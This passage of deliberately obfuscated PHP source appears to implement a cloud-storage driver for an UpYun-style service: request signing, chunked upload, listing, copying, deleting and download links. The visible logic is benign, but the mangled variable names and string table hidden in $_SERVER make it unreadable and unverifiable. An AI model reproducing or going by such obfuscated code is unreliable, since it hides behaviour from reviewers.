$Ñ—²ó•× => $¿ƒÅ„•ï) { if (isset($this->{$Ñ—²ó•×})) { $this->{$Ñ—²ó•×} = $¿ƒÅ„•ï; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($Ğ¤¢”„¢[1523] . LNG($Ğ¤¢”„¢[1442])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($›¸ñÉ, $„Õˆ¥š¯ = "\x47\x45\x54") { $Œô¶Ü† =& $_SERVER[‹è™Ü¸Ñ]; $¢’åšÑ¥ = gmdate($Œô¶Ü†[1471]); $ƒàÅ×ó = base64_encode(hash_hmac($Œô¶Ü†[1524], "{$„Õˆ¥š¯}\x26{$›¸ñÉ}\46{$¢’åšÑ¥}", md5("{$this->userpass}"), !0)); $ŞÜêÀÅ« = array("\x41\165\164\x68\x6f\162\151\x7a\x61\x74\151\157\156\x3a\x55\120\131\125\116\x20{$this->username}\72{$ƒàÅ×ó}", "\104\x61\164\x65\72{$¢’åšÑ¥}"); return $ŞÜêÀÅ«; } public function ussRequest($àúëóÜæ, $«ò»ò­ = "\107\105\x54", $Ãõşá°× = false, $¡Ø‘¥Ü = false, $ä™¤–ÔÎ = false) { $óÂŠİÌ =& $_SERVER[‹è™Ü¸Ñ]; $àúëóÜæ = trim($àúëóÜæ, $óÂŠİÌ[8]); $ïÍª­ê = "\57{$this->bucket}\x2f{$àúëóÜæ}"; $°éÚ‰Ë‹ = $this->ussHeaders($ïÍª­ê, $«ò»ò­); if ($¡Ø‘¥Ü) { $°éÚ‰Ë‹ = array_merge($°éÚ‰Ë‹, $¡Ø‘¥Ü); } $åÒÀİëù = url_request($this->endpoint . $ïÍª­ê, $«ò»ò­, $Ãõşá°×, $°éÚ‰Ë‹, $ä™¤–ÔÎ); if (!$åÒÀİëù) { $ë×ß©ò¾ = LNG($óÂŠİÌ[1525]); $this->writeLog($ë×ß©ò¾); return array($óÂŠİÌ[1277] => !1, $óÂŠİÌ[1267] => $ë×ß©ò¾); } if (strtolower($«ò»ò­) == $óÂŠİÌ[227] || in_array($åÒÀİëù[$óÂŠİÌ[1277]], array($óÂŠİÌ[274], $óÂŠİÌ[1526]))) { $Ãõşá°× = $åÒÀİëù[$óÂŠİÌ[1527]]; } else { $Ãõşá°× = json_decode($åÒÀİëù[$óÂŠİÌ[1267]], !0); if (!$Ãõşá°×) { $Ãõşá°× = $åÒÀİëù[$óÂŠİÌ[1267]]; } else { if (!$åÒÀİëù[$óÂŠİÌ[805]] && isset($Ãõşá°×[$óÂŠİÌ[1528]])) { $Ãõşá°× = $Ãõşá°×[$óÂŠİÌ[1528]]; } } } if (!$åÒÀİëù[$óÂŠİÌ[805]]) { $this->writeLog($this->__errorMessage($Ãõşá°×)); } return array($óÂŠİÌ[1277] => $åÒÀİëù[$óÂŠİÌ[805]], $óÂŠİÌ[1267] => $Ãõşá°×); } private function __errorMessage($²°­İÍ) { $Öõ¬ùÅ‰ =& $_SERVER[‹è™Ü¸Ñ]; if (!$²°­İÍ) { return $Öõ¬ùÅ‰[12]; } static $øÈª˜óÊ = null; if (!$øÈª˜óÊ) { $øÈª˜óÊ = I18n::getType(); } if ($øÈª˜óÊ != $Öõ¬ùÅ‰[1481]) { return $²°­İÍ; } $Éıµ±ã = array($Öõ¬ùÅ‰[1529] => $Öõ¬ùÅ‰[1530], $Öõ¬ùÅ‰[1531] => $Öõ¬ùÅ‰[1532], $Öõ¬ùÅ‰[1533] => $Öõ¬ùÅ‰[1532], $Öõ¬ùÅ‰[1534] => $Öõ¬ùÅ‰[1535], $Öõ¬ùÅ‰[1536] => $Öõ¬ùÅ‰[1537], $Öõ¬ùÅ‰[1538] => $Öõ¬ùÅ‰[1539], $Öõ¬ùÅ‰[1540] => $Öõ¬ùÅ‰[1541]); return isset($Éıµ±ã[$²°­İÍ]) ? $Éıµ±ã[$²°­İÍ] : $²°­İÍ; } public function mkfile($×ù¸³¨, $ãğ‹Š‰å = '', $‰Ğ©Ü° = REPEAT_RENAME) { if ($this->setContent($×ù¸³¨, $ãğ‹Š‰å)) { return $this->getPathOuter($×ù¸³¨); } return !1; } public function mkdir($–ñØ¯É, $é¥İÃİ = REPEAT_SKIP) { $çåŒÑ‹ë =& $_SERVER[‹è™Ü¸Ñ]; $êàç³ÃÍ = trim($–ñØ¯É, $çåŒÑ‹ë[8]); if ($this->_isFolder($êàç³ÃÍ)) { return $this->getPathOuter($êàç³ÃÍ); } $Èá¯î¶‡ = array($çåŒÑ‹ë[1542]); $ÂïóÓç = $this->ussRequest($êàç³ÃÍ, $çåŒÑ‹ë[257], !1, $Èá¯î¶‡); return $ÂïóÓç[$çåŒÑ‹ë[1277]] ? $this->getPathOuter($êàç³ÃÍ) : !1; } public function copyFile($ó¬Š€, $ºÖ•¯±) { $Ó«÷’– =& $_SERVER[‹è™Ü¸Ñ]; $§ò›èÃĞ = array($Ó«÷’–[1543] . "\57{$this->bucket}\57{$ó¬Š€}", $Ó«÷’–[1544]); $Òª˜ûÙ = $this->ussRequest($ºÖ•¯±, $Ó«÷’–[259], !1, $§ò›èÃĞ); return $Òª˜ûÙ[$Ó«÷’–[1277]] ? !0 : $this->getPathOuter($ºÖ•¯±); } public function moveFile($Ò½‚½÷­, $¼ÄÇóİ) { $‹Â¢Ñ„• =& $_SERVER[‹è™Ü¸Ñ]; $ ¿ÄŒ¶ = array($‹Â¢Ñ„•[1545] . "\x2f{$this->bucket}\57{$Ò½‚½÷­}", $‹Â¢Ñ„•[1544]); $ìŠ˜êÆ = $this->ussRequest($¼ÄÇóİ, $‹Â¢Ñ„•[259], !1, $ ¿ÄŒ¶); return $ìŠ˜êÆ[$‹Â¢Ñ„•[1277]] ? !0 : $this->getPathOuter($¼ÄÇóİ); } public function delFile($Ù÷¥) { $ÃÛäîåÕ =& $_SERVER[‹è™Ü¸Ñ]; $– ¨ßë· = $this->ussRequest($Ù÷¥, $ÃÛäîåÕ[1546]); return $– ¨ßë·[$ÃÛäîåÕ[1277]] ? !0 : !1; } public function delFolder($·¤‚Àæœ) { $Ö²Ö¨  =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->exist($·¤‚Àæœ)) { return !0; } $this->listItemCache = !1; $ˆ¥ùĞƒ = $œÖ‘“¿ = array(); $this->fileList($·¤‚Àæœ, $ˆ¥ùĞƒ, $œÖ‘“¿, !0); $this->listItemCache = !0; foreach ($œÖ‘“¿ as $á«ñùû¨) { $‘·½˜†’ = $this->ussRequest($á«ñùû¨[$Ö²Ö¨ [32]], $Ö²Ö¨ [1546]); if (!$‘·½˜†’[$Ö²Ö¨ [1277]]) { return !1; } } foreach ($ˆ¥ùĞƒ as $‘®ø…) { $‘·½˜†’ = $this->ussRequest($‘®ø…, $Ö²Ö¨ [1546]); if (!$‘·½˜†’[$Ö²Ö¨ [1277]]) { return !1; } } $‘·½˜†’ = $this->ussRequest($·¤‚Àæœ, $Ö²Ö¨ [1546]); return $‘·½˜†’[$Ö²Ö¨ [1277]]; } public function rename($ˆğä’È­, $„ƒÕŠ) { if ($this->isFile($ˆğä’È­)) { $„ƒÕŠ = get_path_father($ˆğä’È­) . $„ƒÕŠ; return $this->moveFile($ˆğä’È­, $„ƒÕŠ); } return $this->renameObject($ˆğä’È­, $„ƒÕŠ); } public function fileInfo($ŸÔ—˜áš, $¢úØ×„• = false, $Î¬²ÌÎÛ = array()) { $ÒÊªÛÇá =& $_SERVER[‹è™Ü¸Ñ]; $ÓÛİƒó = array($ÒÊªÛÇá[32] => $this->pathThis($ŸÔ—˜áš), $ÒÊªÛÇá[87] => $this->getPathOuter($ÒÊªÛÇá[8] . $ŸÔ—˜áš), $ÒÊªÛÇá[33] => $ÒÊªÛÇá[230], $ÒÊªÛÇá[79] => isset($Î¬²ÌÎÛ[$ÒÊªÛÇá[79]]) ? $Î¬²ÌÎÛ[$ÒÊªÛÇá[79]] : 0, $ÒÊªÛÇá[169] => $this->ext($ŸÔ—˜áš)); if ($¢úØ×„•) { return $ÓÛİƒó; } $ÓÛİƒó[$ÒÊªÛÇá[231]] = $ÓÛİƒó[$ÒÊªÛÇá[88]] = 0; $ÓÛİƒó[$ÒÊªÛÇá[232]] = $ÓÛİƒó[$ÒÊªÛÇá[233]] = !0; if (empty($Î¬²ÌÎÛ)) { $Î¬²ÌÎÛ = $this->objectMeta($ŸÔ—˜áš); if (!$Î¬²ÌÎÛ) { return $ÓÛİƒó; } } $ÓÛİƒó[$ÒÊªÛÇá[231]] = intval($Î¬²ÌÎÛ[$ÒÊªÛÇá[1547]]); $ÓÛİƒó[$ÒÊªÛÇá[88]] = intval($Î¬²ÌÎÛ[$ÒÊªÛÇá[1548]]); $ÓÛİƒó[$ÒÊªÛÇá[79]] = $Î¬²ÌÎÛ[$ÒÊªÛÇá[79]]; return $ÓÛİƒó; } public function folderInfo($Ù÷Š®È¤, $·ßÃóš = false) { $é¡…äÄÊ =& $_SERVER[‹è™Ü¸Ñ]; $£ı‘¨¥× = array($é¡…äÄÊ[32] => $this->pathThis($Ù÷Š®È¤), $é¡…äÄÊ[87] => $this->getPathOuter($é¡…äÄÊ[8] . $Ù÷Š®È¤), $é¡…äÄÊ[33] => $é¡…äÄÊ[78]); if ($·ßÃóš) { return $£ı‘¨¥×; } $£ı‘¨¥×[$é¡…äÄÊ[231]] = $£ı‘¨¥×[$é¡…äÄÊ[88]] = 0; $£ı‘¨¥×[$é¡…äÄÊ[232]] = $£ı‘¨¥×[$é¡…äÄÊ[233]] = !0; if (empty($ÛÌØµ)) { $ÛÌØµ = $this->objectMeta($Ù÷Š®È¤); if (!$ÛÌØµ) { return $£ı‘¨¥×; } } $£ı‘¨¥×[$é¡…äÄÊ[231]] = intval($ÛÌØµ[$é¡…äÄÊ[1547]]); $£ı‘¨¥×[$é¡…äÄÊ[88]] = intval($ÛÌØµ[$é¡…äÄÊ[1548]]); return $£ı‘¨¥×; } private function listObjs($¬¢®ïèŠ, $ÂÊæ™´É = 0, $Õ¾Å©í = 1000) { $Ê™‡›…œ =& $_SERVER[‹è™Ü¸Ñ]; $ŸÁĞ…¨„ = array($Ê™‡›…œ[1549], $Ê™‡›…œ[1550] . $Õ¾Å©í); if ($ÂÊæ™´É) { $ŸÁĞ…¨„[] = $Ê™‡›…œ[1551] . $ÂÊæ™´É; } $ºáìÆ‚ = $this->ussRequest($¬¢®ïèŠ, $Ê™‡›…œ[261], !1, $ŸÁĞ…¨„); return !$ºáìÆ‚[$Ê™‡›…œ[1277]] ? !1 : $ºáìÆ‚[$Ê™‡›…œ[1267]]; } private function fileList($§â å‚, &$Ÿ¥ÑÃ‡å, &$¿—¡³¦«, $ç‹ÄÂšÊ = false) { $ç§§Ä·û =& $_SERVER[‹è™Ü¸Ñ]; $èèŞø‚Œ = $ç§§Ä·û[12]; $Õ¶üÈáà = 1000; $½ÕÓÉ’« = rtrim($§â å‚, $ç§§Ä·û[8]) . $ç§§Ä·û[8]; while (!0) { check_abort(); $âµ­›‰÷ = $this->listObjs($§â å‚, $èèŞø‚Œ, $Õ¶üÈáà); if (!$âµ­›‰÷) { return !1; } $èèŞø‚Œ = isset($âµ­›‰÷[$ç§§Ä·û[1552]]) ? $âµ­›‰÷[$ç§§Ä·û[1552]] : $ç§§Ä·û[12]; $î¼›¬é¡ = isset($âµ­›‰÷[$ç§§Ä·û[1553]]) ? $âµ­›‰÷[$ç§§Ä·û[1553]] : array(); foreach ($î¼›¬é¡ as $¹ô‡µê˜) { $›±êşãı = $¹ô‡µê˜[$ç§§Ä·û[33]] == $ç§§Ä·û[78] ? !0 : !1; $ªÇ¦Ã = ltrim($½ÕÓÉ’« . $¹ô‡µê˜[$ç§§Ä·û[32]], $ç§§Ä·û[8]) . ($›±êşãı ? $ç§§Ä·û[8] : $ç§§Ä·û[12]); $îñê‘Ğ = array($ç§§Ä·û[32] => $ªÇ¦Ã, $ç§§Ä·û[33] => $›±êşãı ? $ç§§Ä·û[78] : $ç§§Ä·û[230], $ç§§Ä·û[79] => $¹ô‡µê˜[$ç§§Ä·û[413]], $ç§§Ä·û[1548] => $¹ô‡µê˜[$ç§§Ä·û[1554]]); $this->cacheMethodInfoSet($ªÇ¦Ã, $›±êşãı, $îñê‘Ğ); if ($›±êşãı) { $Ÿ¥ÑÃ‡å[] = $ªÇ¦Ã; if ($ç‹ÄÂšÊ) { $this->fileList($ªÇ¦Ã, $Ÿ¥ÑÃ‡å, $¿—¡³¦«, $ç‹ÄÂšÊ); } continue; } $¿—¡³¦«[] = $îñê‘Ğ; } if (count($î¼›¬é¡) < $Õ¶üÈáà) { break; } } $this->cacheMethodInfoSet($§â å‚, !0); } public function listPath($…Í¬åïÊ, $°«¨ÚÒà = false) { $’¯Õ¤Ñ½ =& $_SERVER[‹è™Ü¸Ñ]; $Ëàëˆõå = $í‚î¤¡Ö = array(); $this->fileList($…Í¬åïÊ, $Ëàëˆõå, $í‚î¤¡Ö); foreach ($Ëàëˆõå as $ØÒû™± => $İãØğ˜¹) { $Ëàëˆõå[$ØÒû™±] = $this->folderInfo($İãØğ˜¹, $°«¨ÚÒà); } foreach ($í‚î¤¡Ö as $ØÒû™± => $İãØğ˜¹) { $í‚î¤¡Ö[$ØÒû™±] = $this->fileInfo($İãØğ˜¹[$’¯Õ¤Ñ½[32]], $°«¨ÚÒà, $İãØğ˜¹); } return array($’¯Õ¤Ñ½[85] => $Ëàëˆõå, $’¯Õ¤Ñ½[86] => $í‚î¤¡Ö); } public function has($àİô Ê, $è´ü„½ş = false, $ÖŠßßº = true) { $†ğ¤âò =& $_SERVER[‹è™Ü¸Ñ]; $®ú‚Ó˜Û = $†ğ¤âò[12]; $Ş‚‰Õ§å = 500; $á¼ØÕ±ñ = 0; $Ñò•ô = 0; $Ç¼òä½ = rtrim($àİô Ê, $†ğ¤âò[8]) . $†ğ¤âò[8]; while (!0) { check_abort(); $ËŠ×Ÿ = $this->listObjs($àİô Ê, $®ú‚Ó˜Û, $Ş‚‰Õ§å); if (!$ËŠ×Ÿ) { return !1; } $®ú‚Ó˜Û = isset($ËŠ×Ÿ[$†ğ¤âò[1552]]) ? $ËŠ×Ÿ[$†ğ¤âò[1552]] : $†ğ¤âò[12]; $€­€•˜ = isset($ËŠ×Ÿ[$†ğ¤âò[1553]]) ? $ËŠ×Ÿ[$†ğ¤âò[1553]] : array(); if (empty($€­€•˜)) { break; } $ÄŸÔÓËÖ = array_filter($€­€•˜, function ($Åµé¥É) { $Õ’ÉáìÂ =& $_SERVER[‹è™Ü¸Ñ]; return $Åµé¥É[$Õ’ÉáìÂ[33]] == $Õ’ÉáìÂ[78]; }); $Ëåë‚Ú = count($€­€•˜); $ÄŸÔÓËÖ = count($ÄŸÔÓËÖ); $â—¥¼©‹ = $Ëåë‚Ú - $ÄŸÔÓËÖ; if ($è´ü„½ş) { $Ñò•ô += $ÄŸÔÓËÖ; $á¼ØÕ±ñ += $â—¥¼©‹; if ($Ëåë‚Ú < $Ş‚‰Õ§å) { break; } continue; } if ($ÖŠßßº) { if ($â—¥¼©‹) { return !0; } } else { if ($ÄŸÔÓËÖ) { return !0; } } if ($Ëåë‚Ú < $Ş‚‰Õ§å) { break; } } if ($è´ü„½ş) { return array($†ğ¤âò[239] => $á¼ØÕ±ñ, $†ğ¤âò[240] => $Ñò•ô); } return !1; } public function listAll($„ÃÃ³ŠÁ) { $³º‹Æ¼Š =& $_SERVER[‹è™Ü¸Ñ]; $”Û£«Æé = $çèÓİ½» = array(); $this->fileList($„ÃÃ³ŠÁ, $”Û£«Æé, $çèÓİ½», !0); $îÎ£³Ô· = array_to_keyvalue($çèÓİ½», $³º‹Æ¼Š[32]); foreach ($”Û£«Æé as $‹áÙ»µ) { if (is_string($‹áÙ»µ)) { $îÎ£³Ô·[$‹áÙ»µ] = array($³º‹Æ¼Š[79] => 0); } } return $this->listAllFiles($„ÃÃ³ŠÁ, $îÎ£³Ô·); } public function canRead($”ìıúš) { return $this->exist($”ìıúš) ? !0 : !1; } public function canWrite($ÁĞ¡ïöû) { return $this->exist($ÁĞ¡ïöû) ? !0 : !1; } public function getContent($‡›ıÒ‰ä) { return $this->fileSubstr($‡›ıÒ‰ä, 0, -1); } public function setContent($««âûµí, $Œ…åÛ§Ë = '') { $³Î™Åû =& $_SERVER[‹è™Ü¸Ñ]; if (!$Œ…åÛ§Ë) { $õéıëçŒ = $this->ussRequest($««âûµí, $³Î™Åû[257]); return $õéıëçŒ[$³Î™Åû[1277]]; } $‰œäõ‘È = $this->tempFile($this->pathThis($««âûµí)); file_put_contents($‰œäõ‘È, $Œ…åÛ§Ë); if ($this->upload($««âûµí, $‰œäõ‘È)) { $this->tempFileRemve($‰œäõ‘È); return !0; } return !1; } public function fileSubstr($´Øé§, $ÓüğÛñ², $Ä¼ Ó³Õ) { $ ãşĞğˆ =& $_SERVER[‹è™Ü¸Ñ]; if (!($ÏÚÓ³§Å = $this->link($´Øé§))) { return !1; } $‰ÛœÈçÓ = !1; if ($Ä¼ Ó³Õ > 0) { $œ§Âı€Ã = $ÓüğÛñ² + $Ä¼ Ó³Õ - 1; $‰ÛœÈçÓ = array($ ãşĞğˆ[1513] . $ÓüğÛñ² . $ ãşĞğˆ[462] . $œ§Âı€Ã); } $šş·¹²é = url_request($ÏÚÓ³§Å, $ ãşĞğˆ[261], !1, $‰ÛœÈçÓ); return $šş·¹²é[$ ãşĞğˆ[805]] ? $šş·¹²é[$ ãşĞğˆ[1267]] : !1; } public function upload($“§ß®Ö—, $’Ÿèùºú, $Èíøò™¦ = false, $çøÚé’‰ = REPEAT_REPLACE) { $ôÅº»–Š =& $_SERVER[‹è™Ü¸Ñ]; $Œ÷ùÑ¸ã = IO::size($’Ÿèùºú); if ($Œ÷ùÑ¸ã <= 1024 * 1024 * 200) { $Ä®€º§ƒ = array($ôÅº»–Š[1555] . $’Ÿèùºú); $Í°ŒÓ£ = $this->ussRequest($“§ß®Ö—, $ôÅº»–Š[259], $Ä®€º§ƒ); return $Í°ŒÓ£[$ôÅº»–Š[1277]] ? $this->getPathOuter($“§ß®Ö—) : !1; } $ß¶ĞùÎİ = 1024 * 1024 * 10; $§±©—äğ = array($ôÅº»–Š[1556], $ôÅº»–Š[1557] . $Œ÷ùÑ¸ã, $ôÅº»–Š[1558], $ôÅº»–Š[1559] . $ß¶ĞùÎİ); $Í°ŒÓ£ = $this->ussRequest($“§ß®Ö—, $ôÅº»–Š[259], !1, $§±©—äğ); if (!$Í°ŒÓ£[$ôÅº»–Š[1277]]) { return !1; } $á·Ë×£Ü = $Í°ŒÓ£[$ôÅº»–Š[1267]]; $Àí•ñĞ = 0; $àÒŸÚ›ö = $á·Ë×£Ü[$ôÅº»–Š[1560]]; $êÀã¦Şú = fopen($’Ÿèùºú, $ôÅº»–Š[1436]); if (!$êÀã¦Şú) { return !1; } do { $ÍÈ¨¥˜ª = $á·Ë×£Ü[$ôÅº»–Š[1561]]; fseek_64($êÀã¦Şú, $Àí•ñĞ); $åğ­¯Ì® = fread($êÀã¦Şú, $ÍÈ¨¥˜ª); $Ï¶”Òó· = 0; do { $Ï¶”Òó·++; $á·Ë×£Ü = $this->uploadPart($“§ß®Ö—, $á·Ë×£Ü, $åğ­¯Ì®); } while (!$á·Ë×£Ü && $Ï¶”Òó· < 3); if (!$á·Ë×£Ü) { return !1; } $àÒŸÚ›ö = $á·Ë×£Ü[$ôÅº»–Š[1560]]; $Àí•ñĞ += $ÍÈ¨¥˜ª; } while ($àÒŸÚ›ö != -1); fclose($êÀã¦Şú); $§±©—äğ = array($ôÅº»–Š[1562], $ôÅº»–Š[1563] . $á·Ë×£Ü[$ôÅº»–Š[1564]], $ôÅº»–Š[1558]); $Í°ŒÓ£ = $this->ussRequest($“§ß®Ö—, $ôÅº»–Š[259], !1, $§±©—äğ); return $Í°ŒÓ£[$ôÅº»–Š[1277]] ? $this->getPathOuter($¹­£‹Ëï) : !1; } private function uploadPart($ã®ĞÜı, $î‹ÂŠÁÏ, &$Ü…É¤) { $ûÔ‹Ï„â =& $_SERVER[‹è™Ü¸Ñ]; $Çõæ¨ßî = array($ûÔ‹Ï„â[1565], $ûÔ‹Ï„â[1563] . $î‹ÂŠÁÏ[$ûÔ‹Ï„â[1564]], $ûÔ‹Ï„â[1566] . $î‹ÂŠÁÏ[$ûÔ‹Ï„â[1560]], $ûÔ‹Ï„â[146] . $î‹ÂŠÁÏ[$ûÔ‹Ï„â[1561]]); $ºêøßœ = $this->ussRequest($ã®ĞÜı, $ûÔ‹Ï„â[259], $Ü…É¤, $Çõæ¨ßî); return !$ºêøßœ[$ûÔ‹Ï„â[1277]] ? $ºêøßœ[$ûÔ‹Ï„â[1277]] : $ºêøßœ[$ûÔ‹Ï„â[1267]]; } public function uploadFormData($œµ¸­“, $ª›Ê¼úÓ = 3600) { return $this->uploadPolicy($œµ¸­“, $ª›Ê¼úÓ); } public function multiUploadFormData($á„õÛ, $à÷’³õ» = 3600) { $ò¨ŞÛøñ =& $_SERVER[‹è™Ü¸Ñ]; $½½Ï·Ó† = (int) $GLOBALS[$ò¨ŞÛøñ[7]][$ò¨ŞÛøñ[79]]; return $this->uploadPolicy($á„õÛ, $à÷’³õ», $½½Ï·Ó†); } private function uploadPolicy($âıßÅö¦, $òıì½‚î = 3600, $²¶Š‚®´ = 0) { $¢Ÿ·¦ç =& $_SERVER[‹è™Ü¸Ñ]; $¢òİîœ° = $¢Ÿ·¦ç[8] . $this->bucket; $§öà¹ç = gmdate($¢Ÿ·¦ç[1471]); $¶–Ú•˜ = array($¢Ÿ·¦ç[1567] => $this->bucket, $¢Ÿ·¦ç[1568] => $âıßÅö¦, $¢Ÿ·¦ç[1569] => time() + $òıì½‚î, $¢Ÿ·¦ç[1570] => $§öà¹ç); if ($²¶Š‚®´) { $¶–Ú•˜[$¢Ÿ·¦ç[1456]] = $²¶Š‚®´; } $‹æ‡—˜— = base64_encode(json_encode($¶–Ú•˜)); $ÅŞúĞîñ = base64_encode(hash_hmac($¢Ÿ·¦ç[1524], "\x50\117\123\124\x26{$¢òİîœ°}\x26{$§öà¹ç}\x26{$‹æ‡—˜—}", md5("{$this->userpass}"), !0)); $ªÀŞóø = array($¢Ÿ·¦ç[293] => $‹æ‡—˜—, $¢Ÿ·¦ç[1571] => "\x55\x50\131\x55\116\x20{$this->username}\x3a{$ÅŞúĞîñ}", $¢Ÿ·¦ç[208] => $this->endpoint . $¢òİîœ°); return $ªÀŞóø; } public function download($ªÓÆ íÑ, $¢”šÓÕ) { $©ğœçÒ = IO::getPathInner(IO::mkfile($¢”šÓÕ)); if (!($½Ùò§¯û = $this->link($ªÓÆ íÑ))) { return !1; } $‘Õ»î¥ = 0; $Ì‚İ¿¢ï = 1024 * 200; $Ÿ³Óı†¡ = fopen($©ğœçÒ, $_SERVER[‹è™Ü¸Ñ][1519]); while (!0) { $‡ôÏ²×¯ = $this->fileSubstr($ªÓÆ íÑ, $‘Õ»î¥, $Ì‚İ¿¢ï); if ($‡ôÏ²×¯ === !1) { return !1; } fwrite($Ÿ³Óı†¡, $‡ôÏ²×¯); $‘Õ»î¥ += $Ì‚İ¿¢ï; if (strlen($‡ôÏ²×¯) < $Ì‚İ¿¢ï) { break; } } fclose($Ÿ³Óı†¡); return $¢”šÓÕ; } public function link($öÇù¯Ú®, $îÓ‚ÅĞ¨ = array()) { $àéˆäĞì =& $_SERVER[‹è™Ü¸Ñ]; $öÇù¯Ú® = trim($öÇù¯Ú®, $àéˆäĞì[8]); if (!empty($this->token)) { $Ü²¶Ù¤š = strtotime(date($àéˆäĞì[1572])); $éÏÈÊã = substr(md5($this->token . $àéˆäĞì[360] . $Ü²¶Ù¤š . $àéˆäĞì[1573] . $öÇù¯Ú®), 12, 8) . $Ü²¶Ù¤š; $îÓ‚ÅĞ¨[] = $àéˆäĞì[1574] . $éÏÈÊã; } $ñÚ†õˆ› = !empty($îÓ‚ÅĞ¨) ? $àéˆäĞì[76] . implode($àéˆäĞì[360], $îÓ‚ÅĞ¨) : $àéˆäĞì[12]; return $this->getHost() . $àéˆäĞì[8] . $öÇù¯Ú® . $ñÚ†õˆ›; } public function fileOut($¿œœêÒˆ, $–õ´øšŞ = false, $€Èòïœğ = false, $¯—‰ªğ” = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($¿œœêÒˆ, $–õ´øšŞ, $€Èòïœğ, $¯—‰ªğ”); } if (!$€Èòïœğ) { $€Èòïœğ = $this->pathThis($¿œœêÒˆ); } $ÈÜÉšÍğ = $–õ´øšŞ ? array($_SERVER[‹è™Ü¸Ñ][1575] . rawurlencode($€Èòïœğ)) : array(); $İ¥æ¨şÎ = $this->link($¿œœêÒˆ, $ÈÜÉšÍğ); $this->fileOutLink($İ¥æ¨şÎ); } public function fileOutServer($‡ğ¥Ö©ñ, $øÏºíº€ = false, $Šß÷İ³§ = false, $˜Àß÷é£ = '') { parent::fileOut($‡ğ¥Ö©ñ, $øÏºíº€, $Šß÷İ³§, $˜Àß÷é£); } public function fileOutImage($¨Œá¯ÏØ, $ëøÒ¥”î = 250) { $”­‰¬ëú = $this->link($¨Œá¯ÏØ . $_SERVER[‹è™Ü¸Ñ][1576] . $ëøÒ¥”î); $this->fileOutLink($”­‰¬ëú); } public function fileOutImageServer($¥¢ÛÚÄ¬, $–æÕèÓ = 250) { parent::fileOutImage($¥¢ÛÚÄ¬, $–æÕèÓ); } public function hashMd5($¬èá·Ëµ) { $Ø¶Ê¶–Ò =& $_SERVER[‹è™Ü¸Ñ]; $ÚçŞÖ€ = $this->_objectMeta($¬èá·Ëµ); return isset($ÚçŞÖ€[$Ø¶Ê¶–Ò[245]]) ? $ÚçŞÖ€[$Ø¶Ê¶–Ò[245]] : !1; } public function size($¸ğš¿Àè) { $Ï† ³† = $this->objectMeta($¸ğš¿Àè); return $Ï† ³† ? $Ï† ³†[$_SERVER[‹è™Ü¸Ñ][79]] : 0; } public function info($ïÄÙª®) { if ($this->isFolder($ïÄÙª®)) { return $this->folderInfo($ïÄÙª®); } else { if ($this->isFile($ïÄÙª®)) { return $this->fileInfo($ïÄÙª®); } } return !1; } public function exist($Ööì“¾ø) { return $this->isFile($Ööì“¾ø) || $this->isFolder($Ööì“¾ø); } public function isFile($º˜¦éêâ) { return !$this->isFolder($º˜¦éêâ) && $this->objectMeta($º˜¦éêâ); } public function isFolder($¼ëçôßâ) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][179], $¼ëçôßâ); } protected function objectMeta($»¿ñ¼¿•) { return $this->cacheMethod($_SERVER[‹è™Ü¸Ñ][181], $»¿ñ¼¿•); } protected function _objectMeta($ Ä­·ñü) { $öŠ»Ò³° =& $_SERVER[‹è™Ü¸Ñ]; if ($ Ä­·ñü == $öŠ»Ò³°[12] || $ Ä­·ñü == $öŠ»Ò³°[8]) { return array(); } $æšàµÆÁ = $this->ussRequest($ Ä­·ñü, $öŠ»Ò³°[1577]); if (!$æšàµÆÁ[$öŠ»Ò³°[1277]]) { return null; } $êõóïÎ = isset($æšàµÆÁ[$öŠ»Ò³°[1267]]) ? $æšàµÆÁ[$öŠ»Ò³°[1267]] : array(); if (!isset($êõóïÎ[$öŠ»Ò³°[1578]])) { return null; } $ª›«¤¹â = array($öŠ»Ò³°[33] => isset($êõóïÎ[$öŠ»Ò³°[1578]]) ? $êõóïÎ[$öŠ»Ò³°[1578]] : null, $öŠ»Ò³°[79] => isset($êõóïÎ[$öŠ»Ò³°[1579]]) ? $êõóïÎ[$öŠ»Ò³°[1579]] : null, $öŠ»Ò³°[245] => isset($êõóïÎ[$öŠ»Ò³°[1580]]) ? $êõóïÎ[$öŠ»Ò³°[1580]] : null, $öŠ»Ò³°[1547] => isset($êõóïÎ[$öŠ»Ò³°[1581]]) ? $êõóïÎ[$öŠ»Ò³°[1581]] : null); $ª›«¤¹â[$öŠ»Ò³°[1548]] = isset($êõóïÎ[$öŠ»Ò³°[1582]]) ? strtotime($êõóïÎ[$öŠ»Ò³°[1582]]) : $ª›«¤¹â[$öŠ»Ò³°[1547]]; return $ª›«¤¹â; } protected function _isFolder($¼²è™ğÈ) { $×ÌÌÀç“ =& $_SERVER[‹è™Ü¸Ñ]; if ($¼²è™ğÈ == $×ÌÌÀç“[12] || $¼²è™ğÈ == $×ÌÌÀç“[8]) { return !0; } $Ç“‹µ¬ù = $this->_objectMeta($¼²è™ğÈ); return isset($Ç“‹µ¬ù[$×ÌÌÀç“[33]]) && $Ç“‹µ¬ù[$×ÌÌÀç“[33]] == $×ÌÌÀç“[78] ? !0 : !1; } } class PathDriverUrl extends PathDriverBase { static $_cacheHeader = array(); public function __construct($ß¤œßÉí = false) { } public function exist($Ûöã”¯·) { $•ë¿ø’• = $this->info($Ûöã”¯·); return $•ë¿ø’•[$_SERVER[‹è™Ü¸Ñ][232]]; } public function isFile($â¹Äóóî) { $®ÉÃÅ÷¬ = $this->info($â¹Äóóî); return $®ÉÃÅ÷¬[$_SERVER[‹è™Ü¸Ñ][232]]; } public function isFolder($¯Ä°ÂÀ) { return !1; } public function size($ôùØ’Ğ) { $˜ñì­Ü = $this->info($ôùØ’Ğ); return $˜ñì­Ü[$_SERVER[‹è™Ü¸Ñ][79]]; } public function info($÷…ÂÇ„) { return $this->infoParse($÷…ÂÇ„); } public function infoAuth($ñ³Òç½­) { return $this->infoParse($ñ³Òç½­); } public function infoWithChildren($¸§¢Áé×) { return $this->infoParse($¸§¢Áé×); } public function infoFull($ì¾ÉÜÖÌ) { return $this->infoParse($ì¾ÉÜÖÌ); } private function infoParse($úÌËŸèË) { $­µ¸Ü›û =& $_SERVER[‹è™Ü¸Ñ]; $ÔØé×Ø = $this->header($úÌËŸèË); if (!$ÔØé×Ø || 